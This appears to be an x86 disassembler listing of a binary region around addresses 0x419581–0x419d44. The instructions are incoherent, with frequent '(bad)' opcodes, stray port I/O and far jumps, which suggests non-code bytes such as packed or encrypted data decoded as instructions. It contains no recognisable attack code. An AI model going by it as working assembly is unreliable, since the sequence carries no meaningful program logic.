  419581:	lds    esp,FWORD PTR [esi+0x6c]
  419584:	mov    ch,0xa5
  419586:	shl    DWORD PTR [esi+eiz*4+0x738d9fe4],0x5d
  41958e:	sub    BYTE PTR [edx-0x6a329103],cl
  419594:	jle    0x4195b2
  419596:	xchg   ebx,eax
  419597:	xor    eax,0x1923e05b
  41959c:	xchg   esp,eax
  41959d:	in     al,0x1f
  41959f:	js     0x4195f6
  4195a1:	pop    esi
  4195a2:	dec    ecx
  4195a3:	jge    0x41958c
  4195a5:	lahf   
  4195a6:	aaa    
  4195a7:	dec    esp
  4195a8:	lds    eax,FWORD PTR [esi-0xf8c4eab]
  4195ae:	out    0x75,eax
  4195b0:	mov    ds:0x5742da4f,eax
  4195b5:	pop    eax
  4195b6:	push   0xffffff99
  4195b8:	sub    DWORD PTR [edx-0x30],ecx
  4195bb:	dec    BYTE PTR [edi]
  4195bd:	in     al,0x37
  4195bf:	push   ss
  4195c0:	sbb    dl,BYTE PTR [esi+0x4f]
  4195c3:	mov    edi,0xb5cdec9c
  4195c8:	cmp    esi,esi
  4195ca:	arpl   WORD PTR ds:0x5bc1f8bd,ax
  4195d0:	outs   dx,DWORD PTR ds:[esi]
  4195d1:	push   eax
  4195d2:	in     eax,0xf9
  4195d4:	xchg   esp,eax
  4195d5:	adc    BYTE PTR [ebx+ebx*4-0xdd54e7f],dh
  4195dc:	popa   
  4195dd:	mov    al,0x8a
  4195df:	repz cli 
  4195e1:	fs out dx,eax
  4195e3:	xchg   BYTE PTR [ebp-0x59],dl
  4195e6:	or     DWORD PTR [ebx-0x37],edx
  4195e9:	sub    eax,0x8ff6fe13
  4195ee:	add    DWORD PTR [edx-0x37],eax
  4195f1:	jecxz  0x41963a
  4195f3:	cmp    ebp,DWORD PTR [eax+0x2d]
  4195f6:	adc    DWORD PTR [ecx+0x17],ebp
  4195f9:	sete   ch
  4195fc:	iret   
  4195fd:	(bad)  
  4195fe:	in     al,dx
  4195ff:	or     BYTE PTR [ebx+0x1c],cl
  419602:	test   ecx,esp
  419604:	call   0xaa40:0x82a054f
  41960b:	sub    esp,DWORD PTR [ecx]
  41960d:	mov    dl,dh
  41960f:	and    bh,BYTE PTR [ebx+esi*2-0x5c7b8b5]
  419616:	jbe    0x4195ab
  419618:	push   0x66eb5e53
  41961d:	iret   
  41961e:	sub    eax,0xf42a1338
  419623:	sbb    DWORD PTR [edi+0x51],esi
  419626:	sti    
  419627:	das    
  419628:	mov    edi,0x88faac6
  41962d:	fnstenv [ebp-0x58]
  419630:	fidivr DWORD PTR [esi-0x31]
  419633:	push   ebp
  419634:	sub    edi,edx
  419636:	fstp   TBYTE PTR [edi]
  419638:	add    BYTE PTR [edx],cl
  41963a:	or     ch,bh
  41963c:	sub    BYTE PTR [esi-0x14482371],ah
  419642:	pop    ecx
  419643:	fcomp  st(7)
  419645:	mov    edi,0x84720378
  41964a:	sub    DWORD PTR [ebp+0x78],ebx
  41964d:	inc    BYTE PTR [eax+0x5594a22f]
  419653:	lahf   
  419654:	xlat   BYTE PTR ds:[ebx]
  419655:	(bad)  
  419656:	clc    
  419657:	mov    bl,0x1a
  419659:	lds    esp,FWORD PTR [ecx+0x4]
  41965c:	arpl   WORD PTR [esi-0x3c3d587a],bx
  419662:	push   ebp
  419663:	out    dx,eax
  419664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419665:	nop
  419666:	inc    ebx
  419667:	pop    edi
  419668:	repnz or BYTE PTR [edx],0x52
  41966c:	jmp    0x7f412714
  419671:	xor    dh,BYTE PTR [eax]
  419673:	jmp    FWORD PTR [edx+0x9]
  419676:	or     ebx,edi
  419678:	jns    0x4196b9
  41967a:	jmp    0x4134:0xfbecb6cc
  419681:	and    edx,DWORD PTR [edx+0x18]
  419684:	fwait
  419685:	sub    DWORD PTR [ebx],esi
  419687:	jno    0x4196fc
  419689:	jecxz  0x4196b7
  41968b:	mov    eax,ds:0x8896d270
  419690:	mov    ecx,0x96fe8373
  419695:	test   al,0xa0
  419697:	inc    esp
  419698:	pop    esp
  419699:	pop    eax
  41969a:	mov    edx,0xbb358c06
  41969f:	cdq    
  4196a0:	push   ebp
  4196a1:	mov    al,0xea
  4196a3:	test   al,0x6b
  4196a5:	mov    ah,0x1f
  4196a7:	call   FWORD PTR [edi+edi*2-0x14c6fb92]
  4196ae:	jle    0x4196fa
  4196b0:	mov    eax,0xd004f4c1
  4196b5:	cwde   
  4196b6:	call   0xaeb4:0x1e8b7a2c
  4196bd:	mov    BYTE PTR [esi+0x51],al
  4196c0:	out    0xb2,al
  4196c2:	retf   0x7a0c
  4196c5:	sub    DWORD PTR [esi-0x5e129a33],esp
  4196cb:	mov    bh,0x1d
  4196cd:	cmp    eax,0xe0a7a798
  4196d2:	loop   0x41970e
  4196d4:	push   es
  4196d5:	fs retf 0xe796
  4196d9:	nop
  4196da:	loope  0x419696
  4196dc:	add    al,0xa8
  4196de:	int    0xcf
  4196e0:	mov    ss,WORD PTR [edi]
  4196e2:	retf   0xf5af
  4196e5:	icebp  
  4196e6:	push   cs
  4196e7:	and    dl,BYTE PTR [eax]
  4196e9:	mov    esp,0xf5568c90
  4196ee:	cdq    
  4196ef:	adc    eax,0x51390326
  4196f4:	mov    dh,0x7d
  4196f6:	and    eax,0xee9e463e
  4196fb:	mov    ah,0x36
  4196fd:	mov    esi,0x79fe5f08
  419702:	push   ecx
  419703:	pop    esp
  419704:	icebp  
  419705:	std    
  419706:	mov    ds,WORD PTR [esi+0x3f]
  419709:	mov    esi,0x67a979f1
  41970e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41970f:	fistp  QWORD PTR [edx]
  419711:	push   DWORD PTR [eax]
  419713:	adc    BYTE PTR [edi+eax*1],al
  419716:	push   edx
  419717:	and    DWORD PTR [eax+ebp*8+0x41],edx
  41971b:	call   0x2560:0x6a48aec2
  419722:	xchg   ecx,eax
  419723:	cdq    
  419724:	pop    eax
  419725:	daa    
  419726:	jo     0x41973c
  419728:	leave  
  419729:	pusha  
  41972a:	and    cl,al
  41972c:	iret   
  41972d:	xor    al,al
  41972f:	in     eax,dx
  419730:	or     eax,esp
  419732:	retf   0x38b2
  419735:	bnd jle 0x4197b5
  419738:	stos   DWORD PTR es:[edi],eax
  419739:	stos   BYTE PTR es:[edi],al
  41973a:	ins    BYTE PTR es:[edi],dx
  41973b:	ror    BYTE PTR [eax],1
  41973d:	inc    ecx
  41973e:	inc    edi
  41973f:	test   dl,bl
  419741:	(bad)  
  419742:	out    0xc2,eax
  419744:	lods   eax,DWORD PTR ds:[esi]
  419745:	cmc    
  419746:	xchg   ebx,eax
  419747:	jp     0x419758
  419749:	push   eax
  41974a:	(bad)  
  41974b:	sbb    eax,0xf6db7ee2
  419750:	pop    ecx
  419751:	dec    edi
  419752:	fdivr  DWORD PTR [ebx+eiz*2-0x38]
  419756:	mov    dh,BYTE PTR [esp+esi*4]
  419759:	jmp    0x4224:0xbe58e82d
  419760:	inc    eax
  419761:	sahf   
  419762:	ror    DWORD PTR [eax+ecx*1-0x21584489],1
  419769:	fstp   DWORD PTR [ebx]
  41976b:	lods   al,BYTE PTR ds:[esi]
  41976c:	sub    ebx,DWORD PTR [eax-0x65]
  41976f:	pop    ebp
  419770:	pushf  
  419771:	jmp    0x419725
  419773:	inc    eax
  419774:	xchg   ebp,eax
  419775:	mov    esi,0x2ee64c75
  41977a:	cmc    
  41977b:	stos   DWORD PTR es:[edi],eax
  41977c:	repz in eax,dx
  41977e:	outs   dx,DWORD PTR ds:[esi]
  41977f:	das    
  419780:	ins    DWORD PTR es:[edi],dx
  419781:	ins    BYTE PTR es:[edi],dx
  419782:	retf   0xd8
  419785:	mov    ds:0xfd45066a,eax
  41978a:	dec    ebp
  41978b:	arpl   WORD PTR [ecx+0x602a571a],si
  419791:	inc    esi
  419792:	lock (bad) 
  419794:	cs pushf 
  419796:	in     eax,dx
  419797:	scas   eax,DWORD PTR es:[edi]
  419798:	sub    al,0xdd
  41979a:	or     bl,ch
  41979c:	stc    
  41979d:	(bad)  
  41979e:	mov    ebx,0x59d01563
  4197a3:	inc    edi
  4197a4:	jmp    0x419785
  4197a6:	outs   dx,BYTE PTR ds:[esi]
  4197a7:	xchg   esp,eax
  4197a8:	push   0x53375229
  4197ad:	mov    al,ds:0x4a4a00cd
  4197b2:	arpl   WORD PTR [ebx],di
  4197b4:	xchg   ebp,eax
  4197b5:	push   ds
  4197b6:	(bad)  
  4197b7:	out    0x4e,al
  4197b9:	pop    ecx
  4197ba:	aad    0x57
  4197bc:	cld    
  4197bd:	inc    ebx
  4197be:	adc    BYTE PTR [eax+0x65],0xc1
  4197c2:	sbb    al,0x9d
  4197c4:	inc    eax
  4197c5:	sbb    cl,ah
  4197c7:	xor    eax,0x17189e53
  4197cc:	addr16 sahf 
  4197ce:	adc    ecx,edx
  4197d0:	xchg   ecx,eax
  4197d1:	fwait
  4197d2:	mov    dh,BYTE PTR [edx+0x9]
  4197d5:	jne    0x419810
  4197d7:	pop    es
  4197d8:	xchg   esi,eax
  4197d9:	xor    ch,bh
  4197db:	fst    DWORD PTR [edi-0x73]
  4197de:	imul   edi,DWORD PTR [esi+0x54296ebb],0x30
  4197e5:	fstp   DWORD PTR [edi-0x3c]
  4197e8:	je     0x419863
  4197ea:	mov    ch,0xb4
  4197ec:	jae    0x419782
  4197ee:	push   edi
  4197ef:	ja     0x4197ec
  4197f1:	loope  0x419847
  4197f3:	push   0xffffff9c
  4197f5:	mov    esi,0xf10b2e91
  4197fa:	adc    DWORD PTR [edx-0xa46aca5],0xf483c8ab
  419804:	jle    0x41987c
  419806:	jl     0x419840
  419808:	hlt    
  419809:	in     al,0x89
  41980b:	mov    dl,0xc2
  41980d:	nop
  41980e:	fld    DWORD PTR [ecx+0x61]
  419811:	adc    edx,DWORD PTR [ebx+0x6cf85d40]
  419817:	lds    ecx,FWORD PTR [ebp+0x48]
  41981a:	gs mov esi,0xe1322661
  419820:	add    DWORD PTR [ebx+0x6e],esp
  419823:	inc    ebx
  419824:	ret    0x9c8b
  419827:	push   ds
  419828:	out    0x53,eax
  41982a:	xchg   edi,eax
  41982b:	arpl   WORD PTR [edi-0x5d],ax
  41982e:	and    edi,DWORD PTR [ebp+0x4]
  419831:	mov    ch,0xfa
  419833:	mov    ebx,0x3fb9b609
  419838:	(bad)  
  41983a:	retf   0xe457
  41983d:	inc    eax
  41983e:	mov    dl,0x30
  419840:	out    dx,eax
  419841:	lea    ebx,[ecx]
  419843:	mov    ch,0xae
  419845:	bound  edx,QWORD PTR [edx+0x27f96b10]
  41984b:	mov    al,BYTE PTR [ecx+ecx*4-0xd]
  41984f:	mov    al,0x96
  419851:	jae    0x4197e6
  419853:	jp     0x4198b2
  419855:	fst    QWORD PTR [ecx-0x3d]
  419858:	lea    ecx,[esi+0x17daf50f]
  41985e:	data16 in al,0xf0
  419861:	dec    ecx
  419862:	dec    ecx
  419863:	pop    es
  419864:	fwait
  419865:	aad    0xc4
  419867:	adc    eax,0x2ca35715
  41986c:	adc    ebx,0xffffffe2
  41986f:	rcl    ch,cl
  419871:	xchg   BYTE PTR [ebx],cl
  419873:	mov    bl,0x2e
  419875:	aaa    
  419876:	cmp    ch,BYTE PTR [esi+0x5c]
  419879:	aas    
  41987a:	repnz out dx,al
  41987c:	in     eax,0x55
  41987e:	dec    ebx
  41987f:	mov    al,ds:0xa4011f4c
  419884:	div    DWORD PTR [eax]
  419886:	nop/reserved BYTE PTR [ebp+0x21]
  41988a:	call   0x5eee0a84
  41988f:	push   0x2dd39d66
  419894:	mov    eax,ds:0x767d67b
  419899:	shl    BYTE PTR [esi],0xe9
  41989c:	sub    ebx,ecx
  41989e:	inc    ebp
  41989f:	fnsave ds:0xe538243e
  4198a5:	jne    0x4198c8
  4198a7:	inc    esp
  4198a8:	push   ebx
  4198a9:	hlt    
  4198aa:	sub    ecx,ecx
  4198ac:	stc    
  4198ad:	and    edx,DWORD PTR [ebx-0x32]
  4198b0:	mov    edx,DWORD PTR [ebp-0x51]
  4198b3:	repnz sub eax,0x2d48bc07
  4198b9:	pop    ebx
  4198ba:	gs in  eax,0xd
  4198bd:	sub    DWORD PTR [edi],edi
  4198bf:	or     esi,eax
  4198c1:	mov    dh,0x95
  4198c3:	jae    0x41990a
  4198c5:	mov    BYTE PTR gs:[esi],bh
  4198c8:	mov    ah,BYTE PTR [eax]
  4198ca:	fs popf 
  4198cc:	cmp    dl,cl
  4198ce:	adc    ebx,esp
  4198d0:	js     0x4198f7
  4198d2:	jnp    0x41986e
  4198d4:	cmc    
  4198d5:	mov    DWORD PTR [esi],eax
  4198d7:	shr    bh,1
  4198d9:	cwde   
  4198da:	je     0x4198d6
  4198dc:	nop
  4198dd:	pop    edx
  4198de:	fidivr DWORD PTR [ebp+0x1c]
  4198e1:	loope  0x4198a3
  4198e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198e4:	mov    ch,0x7a
  4198e6:	xor    al,0xe5
  4198e8:	test   BYTE PTR [edx-0x26],dh
  4198eb:	scas   eax,DWORD PTR es:[edi]
  4198ec:	cmp    eax,0xd19d1f12
  4198f1:	inc    esi
  4198f2:	sti    
  4198f3:	mov    bh,0x59
  4198f5:	adc    bl,BYTE PTR [ebx+0x39]
  4198f8:	repnz inc esi
  4198fa:	xchg   edi,eax
  4198fb:	mov    ecx,0xb0f776da
  419900:	icebp  
  419901:	inc    edx
  419902:	in     eax,dx
  419903:	push   ebx
  419904:	js     0x4198fc
  419906:	xchg   ebp,eax
  419907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419908:	lods   eax,DWORD PTR ds:[esi]
  419909:	xchg   edx,eax
  41990a:	mov    BYTE PTR [ebx-0x2c],bl
  41990d:	sahf   
  41990e:	mov    ch,0xd3
  419910:	sbb    al,0xa6
  419912:	sar    DWORD PTR [ebx+0x2b],0x32
  419916:	mov    DWORD PTR [ebp+0x7369f691],ecx
  41991c:	xchg   al,ah
  41991e:	jmp    0x419964
  419920:	cmp    al,BYTE PTR [ebx+edi*8+0x1cad22e9]
  419927:	push   eax
  419928:	mov    es,WORD PTR [ebx+ebx*8-0x77]
  41992c:	and    bh,BYTE PTR [ebp+0x6f1c93d4]
  419932:	xchg   DWORD PTR [ecx-0x5e36f170],esi
  419938:	sub    al,0x55
  41993a:	push   ebx
  41993b:	stos   DWORD PTR es:[edi],eax
  41993c:	out    0xfd,al
  41993e:	dec    edi
  41993f:	dec    edi
  419940:	gs scas eax,DWORD PTR es:[edi]
  419942:	cmp    DWORD PTR [ebx+ebp*2+0x32],ebx
  419946:	(bad)  
  419947:	or     ecx,DWORD PTR [edi+0x567a4487]
  41994d:	shl    DWORD PTR [esi+edi*2],0x57
  419951:	(bad)  
  419952:	dec    BYTE PTR [ebx-0x6b6b174]
  419958:	inc    ebx
  419959:	in     al,dx
  41995a:	int3   
  41995b:	pop    ss
  41995c:	add    BYTE PTR [ebx-0x4096a9f],bl
  419962:	mov    ah,0x51
  419964:	(bad)  
  419966:	mov    eax,ds:0xffe5b0c9
  41996b:	and    edx,esi
  41996d:	pop    es
  41996e:	dec    edx
  41996f:	pop    eax
  419970:	out    0xa7,al
  419972:	pop    edi
  419973:	jmp    0x419901
  419975:	(bad)  
  419976:	pop    esp
  419977:	sar    BYTE PTR [ebp-0x1d],1
  41997a:	pop    esp
  41997b:	and    ebp,DWORD PTR ds:0x4f3ac710
  419981:	push   esi
  419982:	sti    
  419983:	int    0x1
  419985:	xchg   edi,eax
  419986:	test   eax,ecx
  419988:	inc    edi
  419989:	add    cl,BYTE PTR [ebx+0x6b]
  41998c:	jge    0x419942
  41998e:	call   0x2cc6c6db
  419993:	mov    ch,0xea
  419995:	lock aam 0x2d
  419998:	mov    DWORD PTR [ecx],0x246f63c0
  41999e:	sbb    ebp,ebp
  4199a0:	mov    al,ds:0xf65e76f2
  4199a5:	xor    ch,BYTE PTR [ecx+0x53b780a1]
  4199ab:	pop    edx
  4199ac:	into   
  4199ad:	mov    esp,0xfce8d9db
  4199b2:	inc    esi
  4199b3:	pop    esi
  4199b4:	out    0x16,al
  4199b6:	xor    eax,0x7047b34e
  4199bb:	jl     0x419947
  4199bd:	inc    esi
  4199be:	mov    edi,0x9db69edc
  4199c3:	outs   dx,BYTE PTR ds:[esi]
  4199c4:	xor    al,0xf1
  4199c6:	push   eax
  4199c7:	mov    dl,0x8c
  4199c9:	jl     0x419a3c
  4199cb:	xor    dh,BYTE PTR [ebx+0x52]
  4199ce:	imul   edx,DWORD PTR [esi+0x361b9bc7],0x650767b6
  4199d8:	fcomp  QWORD PTR [edx+0x68e741bf]
  4199de:	in     al,0xea
  4199e0:	enter  0x699d,0xcb
  4199e4:	jmp    0x4199a5
  4199e6:	pop    edx
  4199e7:	mov    edx,0xc14f8352
  4199ec:	scas   al,BYTE PTR es:[edi]
  4199ed:	push   ecx
  4199ee:	adc    al,0xce
  4199f0:	lods   al,BYTE PTR ds:[esi]
  4199f1:	adc    bh,al
  4199f3:	cld    
  4199f4:	stc    
  4199f5:	mov    ecx,0x30ed3f30
  4199fa:	mov    edi,0x7e24be03
  4199ff:	into   
  419a00:	xchg   edx,eax
  419a01:	fbstp  TBYTE PTR [ebx]
  419a03:	iret   
  419a04:	push   eax
  419a05:	push   eax
  419a06:	imul   esi,DWORD PTR [ebx+0x40],0xffffffb8
  419a0a:	sbb    eax,0x92b3058
  419a0f:	mov    dl,0x6
  419a11:	ja     0x419a8c
  419a13:	push   ds
  419a14:	xor    esp,DWORD PTR [esi+edi*2+0xfb5a3d0]
  419a1b:	outs   dx,DWORD PTR ds:[esi]
  419a1c:	inc    esi
  419a1d:	sbb    BYTE PTR [ecx],cl
  419a1f:	das    
  419a20:	xor    ch,bl
  419a22:	jle    0x4199c4
  419a24:	xor    bh,BYTE PTR [ecx+esi*8-0x3b55938e]
  419a2b:	sbb    al,BYTE PTR [edx+0x59]
  419a2e:	jge    0x4199e8
  419a30:	bound  esi,QWORD PTR [edi]
  419a32:	loope  0x419a8d
  419a34:	fldcw  WORD PTR ds:0x22da468
  419a3a:	in     al,0xd7
  419a3c:	mov    DWORD PTR [esi-0x27822968],eax
  419a42:	jp     0x4199d4
  419a44:	lods   al,BYTE PTR ds:[esi]
  419a45:	(bad)  
  419a47:	leave  
  419a48:	sub    dl,BYTE PTR [ecx-0x5]
  419a4b:	mov    edx,DWORD PTR [ebx-0x46]
  419a4e:	adc    BYTE PTR [esi-0x13],al
  419a51:	mov    ds:0x3288635d,eax
  419a56:	shr    bl,1
  419a58:	inc    edi
  419a59:	out    0x2e,al
  419a5b:	call   0xf5f:0x539da66
  419a62:	ret    0x7c6c
  419a65:	pop    edi
  419a66:	jmp    FWORD PTR ds:0x48db401d
  419a6c:	and    al,BYTE PTR [ebx-0x3f]
  419a6f:	inc    ebx
  419a70:	and    ecx,0x95f616db
  419a76:	dec    edi
  419a77:	pop    esi
  419a78:	lds    edx,FWORD PTR [ebx+0x5d471300]
  419a7e:	in     al,dx
  419a7f:	pusha  
  419a80:	jo     0x419ac6
  419a82:	fisubr DWORD PTR [edx-0x9]
  419a85:	and    BYTE PTR [ebx-0x69],cl
  419a88:	and    BYTE PTR [esi],al
  419a8a:	lock jo 0x419a25
  419a8d:	stc    
  419a8e:	leave  
  419a8f:	sbb    ebx,eax
  419a91:	les    ecx,FWORD PTR [bx+si-0x49e4]
  419a96:	lds    edi,FWORD PTR [edx+eiz*4-0x76b847c1]
  419a9d:	dec    edi
  419a9e:	clc    
  419a9f:	jg     0x419a4e
  419aa1:	and    edx,esi
  419aa3:	and    BYTE PTR [edi],ch
  419aa5:	fdiv   QWORD PTR [ebp+0x1d24e3b7]
  419aab:	sub    DWORD PTR ds:0xf5ab85bd,ebp
  419ab1:	pop    es
  419ab2:	mov    cl,0xec
  419ab4:	sbb    al,0xd
  419ab6:	pop    edi
  419ab7:	or     al,0x8a
  419ab9:	inc    ebp
  419aba:	ss fwait
  419abc:	pop    esi
  419abd:	push   ebx
  419abe:	and    eax,0x31e8d9c7
  419ac3:	xchg   DWORD PTR [ecx+ebp*1-0x34],eax
  419ac7:	ret    0x77fa
  419aca:	xchg   edx,eax
  419acb:	lods   al,BYTE PTR ds:[esi]
  419acc:	and    bl,BYTE PTR [edi+0x16]
  419acf:	mov    esp,0xc88c6c04
  419ad4:	in     al,dx
  419ad5:	jle    0x419a5b
  419ad7:	adc    ah,BYTE PTR [edx-0x125c518]
  419add:	push   esi
  419ade:	fdiv   st(2),st
  419ae0:	fist   WORD PTR [ecx+0x60df6e1e]
  419ae6:	cmp    cl,dh
  419ae8:	sar    DWORD PTR [esp+edi*1],0xb6
  419aec:	hlt    
  419aed:	out    0xaa,eax
  419aef:	js     0x419abe
  419af1:	xchg   esi,eax
  419af2:	ins    BYTE PTR es:[edi],dx
  419af3:	xor    esp,DWORD PTR [edx-0xf6940c]
  419af9:	jmp    0x419b5e
  419afb:	retf   
  419afc:	adc    bl,dh
  419afe:	enter  0x4f3a,0x9
  419b02:	loope  0x419ae2
  419b04:	dec    esp
  419b05:	dec    esi
  419b06:	and    BYTE PTR [ebx],0xde
  419b09:	sbb    al,0x34
  419b0b:	jb     0x419ac8
  419b0d:	imul   ecx,ecx,0xffffffc9
  419b10:	fldz   
  419b12:	or     eax,0xc366b7c2
  419b17:	mov    al,ds:0xa0483127
  419b1c:	jp     0x419b80
  419b1e:	dec    ecx
  419b1f:	loope  0x419aeb
  419b21:	jle    0x419b2f
  419b23:	or     esi,ecx
  419b25:	popf   
  419b26:	jb     0x419b36
  419b28:	rcr    eax,0xd5
  419b2b:	adc    cl,bl
  419b2d:	aam    0xdd
  419b2f:	push   ebp
  419b30:	dec    ecx
  419b31:	int    0xb
  419b33:	mov    ecx,0xadcc7a58
  419b38:	xchg   ebx,eax
  419b39:	gs jns 0x419b84
  419b3c:	adc    dh,bl
  419b3e:	in     eax,dx
  419b3f:	retf   
  419b40:	iret   
  419b41:	imul   esi,DWORD PTR [esi],0x7d
  419b44:	xchg   ebp,eax
  419b45:	fwait
  419b46:	adc    al,0x4a
  419b48:	jmp    0xca03add6
  419b4d:	ret    
  419b4e:	jge    0x419ae4
  419b50:	call   0x93b3:0xcb8d52e8
  419b57:	lods   eax,DWORD PTR ds:[esi]
  419b58:	int    0x37
  419b5a:	sub    al,0x16
  419b5c:	mov    WORD PTR [ecx+ecx*2],ss
  419b5f:	xchg   edx,eax
  419b60:	jbe    0x419bdb
  419b62:	pop    esi
  419b63:	(bad)  
  419b64:	push   ebp
  419b65:	int    0x5
  419b67:	inc    esi
  419b68:	jmp    0xafb36de4
  419b6d:	push   eax
  419b6e:	test   eax,0xdf2b9062
  419b73:	xchg   ch,bl
  419b75:	fwait
  419b76:	sbb    al,0x1c
  419b78:	repnz mov ds:0x5a68b2a1,al
  419b7e:	inc    edx
  419b7f:	pop    ecx
  419b80:	xchg   esp,eax
  419b81:	out    0x5c,eax
  419b83:	or     eax,0x1a842b3c
  419b88:	xor    al,0xc1
  419b8a:	mov    eax,ds:0x1f5ccacd
  419b8f:	add    ah,BYTE PTR [edx]
  419b91:	push   ds
  419b92:	adc    al,0x2e
  419b94:	sbb    cl,BYTE PTR [ebx+0x15d48a11]
  419b9a:	pushf  
  419b9b:	mov    DWORD PTR [edi],ecx
  419b9d:	xchg   esp,eax
  419b9e:	adc    al,0x3
  419ba0:	loope  0x419b75
  419ba2:	in     al,dx
  419ba3:	inc    ebp
  419ba4:	iret   
  419ba5:	xchg   BYTE PTR [edx+0x15798ad1],al
  419bab:	cmp    ecx,ecx
  419bad:	sub    al,0x54
  419baf:	sbb    edx,DWORD PTR ds:[esi+0x53]
  419bb3:	push   esi
  419bb4:	cmp    al,0x33
  419bb6:	lock mov ds:0xd54e755d,eax
  419bbc:	add    cl,BYTE PTR [esi+esi*1+0x4b8403cf]
  419bc3:	std    
  419bc4:	fld1   
  419bc6:	add    edx,DWORD PTR [eax]
  419bc8:	ins    DWORD PTR es:[edi],dx
  419bc9:	push   esp
  419bca:	rcl    BYTE PTR [ebx-0x6f836864],0x9a
  419bd1:	pextrw esi,(bad),0xc5
  419bd3:	jb     0x419c29
  419bd5:	mov    DWORD PTR [eax+0x4a],ebp
  419bd8:	pusha  
  419bd9:	cli    
  419bda:	adc    ah,BYTE PTR [ecx]
  419bdc:	sub    DWORD PTR [esi+0x7efc8692],esp
  419be2:	inc    esp
  419be3:	xor    edx,esp
  419be5:	inc    ecx
  419be6:	pop    edi
  419be7:	(bad)  
  419be9:	or     ebp,DWORD PTR [esi-0x4bddaab0]
  419bef:	sar    BYTE PTR [ecx+0x71],1
  419bf2:	sub    BYTE PTR [ebx-0x2aacef3b],dh
  419bf8:	mov    dh,0xb7
  419bfa:	sub    edx,eax
  419bfc:	or     dh,BYTE PTR [ebp-0x3c]
  419bff:	shr    bl,1
  419c01:	push   eax
  419c02:	mov    ?,WORD PTR [ebx]
  419c04:	sar    BYTE PTR [ebx],0x6f
  419c07:	or     eax,0x885fbd5e
  419c0c:	dec    edi
  419c0d:	or     DWORD PTR [eax-0x1b889f0d],ebx
  419c13:	add    cl,BYTE PTR [ebx+0x1b]
  419c16:	repnz lods eax,DWORD PTR ds:[esi]
  419c18:	push   esi
  419c19:	cs push es
  419c1b:	cmc    
  419c1c:	imul   esi,DWORD PTR [ebp+0x30e9aa8f],0x5b4d0dce
  419c26:	push   cs
  419c27:	and    BYTE PTR [edx-0x9],al
  419c2a:	rcr    DWORD PTR [eax+eiz*4],0xe6
  419c2e:	pop    ecx
  419c2f:	dec    esi
  419c30:	test   BYTE PTR gs:[esi-0x3a242fcc],ch
  419c37:	xor    cl,BYTE PTR [ecx-0x1a9652fe]
  419c3d:	pop    ecx
  419c3e:	adc    al,0x21
  419c40:	(bad)  
  419c41:	outs   dx,DWORD PTR ds:[esi]
  419c42:	int    0x95
  419c44:	cmc    
  419c45:	or     eax,0xd275c161
  419c4a:	mov    bl,BYTE PTR [ecx+0x9c94c19]
  419c50:	pop    esi
  419c51:	cmp    eax,0x808836c2
  419c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c57:	int3   
  419c58:	push   ebp
  419c59:	push   ds
  419c5a:	adc    BYTE PTR [esi+0x22],0xa4
  419c5e:	xor    eax,0xc5eedf5d
  419c63:	int    0xde
  419c65:	mov    ecx,0x8527c846
  419c6a:	pop    esp
  419c6b:	rol    DWORD PTR [esi+ebx*1],0xd0
  419c6f:	int3   
  419c70:	dec    ecx
  419c71:	ins    BYTE PTR es:[edi],dx
  419c72:	pop    ss
  419c73:	test   ch,al
  419c75:	out    0x44,eax
  419c77:	mov    edi,0x9ed86a2c
  419c7c:	cmc    
  419c7d:	jae    0x419c24
  419c7f:	jle    0x419c33
  419c81:	jmp    0x66b2:0xe94e432d
  419c88:	dec    esi
  419c89:	js     0x419c3e
  419c8b:	ds mov ecx,0xd99a6c8f
  419c91:	mov    bh,0xc7
  419c93:	jl     0x419c47
  419c95:	push   ebp
  419c96:	sub    al,0x47
  419c98:	out    0x3d,eax
  419c9a:	test   DWORD PTR [ebp+0x5942e07c],ebp
  419ca0:	arpl   WORD PTR [ecx-0x7a],cx
  419ca3:	push   ds
  419ca4:	test   BYTE PTR [edi],cl
  419ca6:	adc    eax,0x42208812
  419cab:	(bad)  
  419cac:	jmp    DWORD PTR [ecx-0x1e]
  419caf:	leave  
  419cb0:	push   0xa9c30aef
  419cb5:	in     eax,0xa6
  419cb7:	pusha  
  419cb8:	lods   eax,DWORD PTR ds:[esi]
  419cb9:	xchg   sp,ax
  419cbb:	ret    
  419cbc:	push   cs
  419cbd:	dec    edi
  419cbe:	inc    ebx
  419cbf:	jne    0x419cd6
  419cc1:	sahf   
  419cc2:	out    0xb7,al
  419cc4:	stc    
  419cc5:	adc    esi,DWORD PTR [edi]
  419cc7:	je     0x419c87
  419cc9:	sub    DWORD PTR [ecx],0x3a
  419ccc:	lds    edx,FWORD PTR [ecx+0x6ae432d0]
  419cd2:	adc    eax,0x9a81da08
  419cd7:	cmp    BYTE PTR [ebx],ch
  419cd9:	in     eax,0xe2
  419cdb:	addr16 jp 0x419d52
  419cde:	popa   
  419cdf:	or     BYTE PTR [esi],0x60
  419ce2:	dec    ebp
  419ce3:	push   ss
  419ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ce5:	dec    eax
  419ce6:	jne    0x419cc5
  419ce8:	mov    al,0x32
  419cea:	popa   
  419ceb:	jle    0x419d52
  419ced:	mov    edx,0x78c6d470
  419cf2:	scas   eax,DWORD PTR es:[edi]
  419cf3:	mov    edx,?
  419cf5:	repz aas 
  419cf7:	enter  0xe3fb,0x3a
  419cfb:	aas    
  419cfc:	add    eax,0x8a684d3c
  419d01:	jecxz  0x419d72
  419d03:	out    dx,al
  419d04:	int3   
  419d05:	jmp    0x3957:0x1a693766
  419d0c:	cwde   
  419d0d:	jg     0x419d4f
  419d0f:	jne    0x419cd0
  419d11:	mov    cl,0x7f
  419d13:	jmp    0x20285e6
  419d18:	cmp    ecx,esi
  419d1a:	mov    cl,BYTE PTR ds:0x7a33eb15
  419d20:	cs jbe 0x419d5d
  419d23:	or     BYTE PTR [ebx],bl
  419d25:	inc    ebx
  419d26:	push   0xffffffd4
  419d28:	stc    
  419d29:	xor    dh,BYTE PTR [esi-0x77]
  419d2c:	mov    al,ds:0xd83f399
  419d31:	mov    ebx,0x30a8a65f
  419d36:	fcomp  QWORD PTR [ecx-0x5286d2b9]
  419d3c:	lods   al,BYTE PTR ds:[esi]
  419d3d:	lahf   
  419d3e:	rol    BYTE PTR [esi],1
  419d40:	push   0x27
  419d42:	sbb    al,0x79
  419d44:	and    bl,BYTE PTR [ebx]
